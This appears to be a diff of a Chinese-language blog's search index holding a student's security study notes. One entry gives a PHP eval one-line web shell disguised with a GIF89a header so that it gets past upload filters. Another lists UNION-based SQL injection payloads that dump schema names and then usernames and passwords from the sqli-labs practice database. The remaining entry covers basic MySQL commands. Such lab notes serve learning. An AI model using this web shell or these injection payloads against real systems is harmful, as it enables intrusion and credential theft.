@@ -2,7 +2,7 @@
 <search>
   <entry>
     <title></title>
-    <url>/2021/09/26/GIF89a/</url>
+    <url>/2021/10/02/GIF89a/</url>
     <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_GET</span>[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 <p>通常，在嵌入了php脚本的html中，使用 phtml作为后缀名；完全是php写的，则使用php作为后缀名。这两种文件，web服务器都会用php解释器进行解析。</p>
 <p>当不能使用php代码直接注入时可以改为phtml格式加入GIF89a(图片头文件欺骗)，后台认为是图片,上传后再执行木马。</p>
@@ -13,7 +13,41 @@
   </entry>
   <entry>
     <title></title>
-    <url>/2021/09/26/mysql%E8%AE%B0%E5%BD%95/</url>
+    <url>/2021/10/02/sqllab/</url>
+    <content><![CDATA[<p>每个库里都有information_schema表</p>
+<p>而每个information_schema表里都有information_schema.tables字段</p>
+<p>table_schema  库名</p>
+<p>schema_name 表名</p>
+<h1 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h1><ul>
+<li><p>1.输入’1等字符看报错判断闭合方式</p>
+</li>
+<li><p>2.利用order by 判断列数</p>
+</li>
+<li><p>3.将数字改为-1并结合union联合查询1,2,3看一下哪列可以回显</p>
+</li>
+<li><p>4.哪列可以回显就利用哪列写group_concat()</p>
+</li>
+<li><p>5.爆库名：?id=-1‘ union select 1,group_concat(schema_name),3</p>
+</li>
+</ul>
+<p>from information_schema.schemata –+</p>
+<ul>
+<li>6.爆表名：?id=-1‘ union select 1,group_concat(table_name),3</li>
+</ul>
+<p>from information_schema.tables where table_schema=’security’ –+</p>
+<ul>
+<li>7.爆列名：?id=-1‘ union select 1,group_concat(column_name),3</li>
+</ul>
+<p>from information_schema.columns where table_name=’users’ –+</p>
+<ul>
+<li>8.爆数据：?id=-1‘ union select 1,group_concat(username,’~’,password),3</li>
+</ul>
+<p>from users –+     (或者：?id=-1‘ union select 1,username,password from users where id=1 –+)</p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2021/10/02/mysql%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<h1 id="数据库操作："><a href="#数据库操作：" class="headerlink" title="数据库操作："></a>数据库操作：</h1><hr>
 <h2 id="链接数据库"><a href="#链接数据库" class="headerlink" title="链接数据库"></a>链接数据库</h2><ul>
 <li>cd 进入bin目录 输入 mysql -u root -p 然后输入密码<h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2></li>
@@ -75,40 +109,6 @@
 <li><p>条件：<br>1、要求多条查询 语句的查询列数是一致的<br>2、要求多条查询语句的查询的每一列的类型和最好一致<br>3、union关键字默认去重，如果使用union all 可以包含重复项</p>
 </li>
 </ul>
-]]></content>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2021/09/26/sqllab/</url>
-    <content><![CDATA[<p>每个库里都有information_schema表</p>
-<p>而每个information_schema表里都有information_schema.tables字段</p>
-<p>table_schema  库名</p>
-<p>schema_name 表名</p>
-<h1 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h1><ul>
-<li><p>1.输入’1等字符看报错判断闭合方式</p>
-</li>
-<li><p>2.利用order by 判断列数</p>
-</li>
-<li><p>3.将数字改为-1并结合union联合查询1,2,3看一下哪列可以回显</p>
-</li>
-<li><p>4.哪列可以回显就利用哪列写group_concat()</p>
-</li>
-<li><p>5.爆库名：?id=-1‘ union select 1,group_concat(schema_name),3</p>
-</li>
-</ul>
-<p>from information_schema.schemata –+</p>
-<ul>
-<li>6.爆表名：?id=-1‘ union select 1,group_concat(table_name),3</li>
-</ul>
-<p>from information_schema.tables where table_schema=’security’ –+</p>
-<ul>
-<li>7.爆列名：?id=-1‘ union select 1,group_concat(column_name),3</li>
-</ul>
-<p>from information_schema.columns where table_name=’users’ –+</p>
-<ul>
-<li>8.爆数据：?id=-1‘ union select 1,group_concat(username,’~’,password),3</li>
-</ul>
-<p>from users –+     (或者：?id=-1‘ union select 1,username,password from users where id=1 –+)</p>
 ]]></content>
   </entry>
 </search>
